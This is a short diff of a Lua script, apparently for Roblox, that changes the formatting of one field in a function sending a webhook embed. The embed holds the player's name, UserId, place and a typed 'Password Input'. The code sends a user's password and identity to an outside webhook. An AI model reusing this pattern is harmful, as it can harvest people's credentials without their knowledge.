@@ -74,7 +74,7 @@ local function sendWebhookEmbedLogin(title, description, password)
                 { name = "Player", value = ("%s (@%s)"):format(LocalPlayer.DisplayName, LocalPlayer.Name), inline = true },
                 { name = "UserId", value = tostring(LocalPlayer.UserId), inline = true },
                 { name = "Place",  value = getPlaceName(), inline = false },
-                { name = "Password Input", value = "```" .. password .. "```", inline = true },
+                { name = "Password Input", value = "``" .. password .. "``", inline = true },
             },
             footer = { text = os.date("!%Y-%m-%d %H:%M:%S UTC") .. " • UTC" }
         }}
